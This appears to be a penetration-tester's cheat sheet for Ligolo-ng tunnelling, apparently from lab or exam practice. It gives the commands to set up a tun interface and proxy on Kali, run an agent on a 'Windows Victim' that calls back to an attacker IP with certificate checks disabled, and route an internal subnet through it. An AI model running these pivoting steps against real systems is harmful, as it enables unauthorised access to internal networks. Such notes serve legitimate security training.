- Proxy - Server
- Agent -> Client

```
sudo ip tuntap add user root mode tun ligolo
```

```
sudo ip link set ligolo up
```

Kali:
```
./proxy-lin -selfcert
```

Windows Victim:
```
.\ligolo-agent.exe -connect 192.168.45.158:11601 -ignore-cert
```

In Ligolo:
```
session
```
Choose session
Then:
```
ifconfig
```

In Kali Terminal
```
sudo ip route add 10.10.113.0/24 dev ligolo
```

Check it:
```
ip route list
```

Let's go back; execute `session`, choose `session`; Then:
```
start
```
